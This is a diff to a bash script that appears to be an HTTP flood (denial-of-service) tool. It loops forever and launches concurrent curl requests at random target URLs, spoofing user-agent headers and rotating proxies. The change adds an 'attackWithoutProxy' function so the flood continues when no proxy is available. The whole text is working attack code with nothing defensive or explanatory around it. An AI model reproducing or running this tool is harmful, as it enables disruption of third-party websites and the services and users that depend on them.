@@ -88,6 +88,18 @@ function attack()
     echo -e "Current threads : $THREADS"
 }
 
+function attackWithoutProxy()
+{
+    local URL=$1
+    local H=$2
+    local THREADS=$3
+    RESULT=`$CURL -H user-agent:"$H" $URL &`
+
+    echo -e "$URL"
+    echo -e "HTTP Status : $RESULT\tProxy : \033[0;31mNo Proxy\033[0m"
+    echo -e "Current threads : $THREADS"
+}
+
 while [ 1 ]
 do
 
@@ -97,16 +109,19 @@ do
     #Max curl connections
     if [ "$THREAD" -lt $MC ]
     then
-        #Random proxy server
-        P_R=${P[$RANDOM%TP]}
-
         #Random headers
         H_R=${H[$RANDOM%TH]}
 
 	#Random target url
 	T_R=${T[$RANDOM%TT]}
 
-	#ATTACK!
-        attack $T_R $P_R "$H_R" $THREAD &
+        #Random proxy server
+        P_R=${P[$RANDOM%TP]}
+        if [ -z $P_R ]
+        then
+            attackWithoutProxy $T_R "$H_R" $THREAD &
+        else
+            attack $T_R $P_R "$H_R" $THREAD &
+        fi
     fi
 done
